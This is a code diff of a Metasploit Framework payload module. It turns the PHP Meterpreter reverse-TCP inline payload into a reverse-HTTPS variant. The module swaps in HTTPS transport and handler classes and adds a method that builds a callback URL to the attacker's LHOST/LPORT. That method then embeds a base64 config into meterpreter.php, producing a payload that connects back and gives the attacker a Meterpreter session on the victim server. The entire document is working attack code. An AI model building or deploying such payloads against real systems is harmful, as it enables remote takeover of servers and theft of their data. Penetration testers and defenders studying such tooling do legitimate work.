@@ -7,22 +7,22 @@ module MetasploitModule
   CachedSize = :dynamic
 
   include Msf::Payload::Single
-  include Msf::Payload::Php::ReverseTcp
+  include Msf::Payload::Php::ReverseHttp
   include Msf::Payload::TransportConfig
   include Msf::Payload::UUID::Options
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
     super(
-      update_info(
+      merge_info(
         info,
-        'Name' => 'PHP Meterpreter, Reverse TCP Inline',
-        'Description' => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
-        'Author' => ['egypt'],
+        'Name' => 'PHP Meterpreter, Reverse HTTPS Inline',
+        'Description' => 'Connect back to attacker and spawn a Meterpreter server via HTTPS (PHP)',
+        'Author' => 'OJ Reeves',
+        'License' => MSF_LICENSE,
         'Platform' => 'php',
         'Arch' => ARCH_PHP,
-        'License' => MSF_LICENSE,
-        'Handler' => Msf::Handler::ReverseTcp,
+        'Handler' => Msf::Handler::ReverseHttps,
         'Session' => Msf::Sessions::Meterpreter_Php_Php
       )
     )
@@ -32,7 +32,7 @@ module MetasploitModule
     ds = opts[:datastore] || datastore
     opts[:uuid] ||= generate_payload_uuid
 
-    opts[:transport_config] ||= [transport_config_reverse_tcp(opts)]
+    opts[:transport_config] ||= [transport_config_reverse_https(opts)]
 
     config_opts = {
       ascii_str:         true,
@@ -47,10 +47,24 @@ module MetasploitModule
     config.to_b
   end
 
-  def generate(_opts = {})
+  def generate_reverse_http(opts = {})
+    opts[:scheme] = 'https'
+    opts[:uri_uuid_mode] = :init_connect
+
+    ds = opts[:datastore] || datastore
+    opts.merge!({
+      host: ds['LHOST'] || '127.127.127.127',
+      port: ds['LPORT'],
+    })
+    url = generate_callback_url(opts)
+
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
 
-    config_block = Rex::Text.encode_base64(generate_config(_opts))
+    config_block = Rex::Text.encode_base64(generate_config(
+      url: url,
+      scheme: 'https',
+      stageless: true
+    ))
     met = met.sub('"CONFIG_BLOCK", ""', "\"CONFIG_BLOCK\", \"#{config_block}\"")
 
     if datastore['MeterpreterDebugBuild']
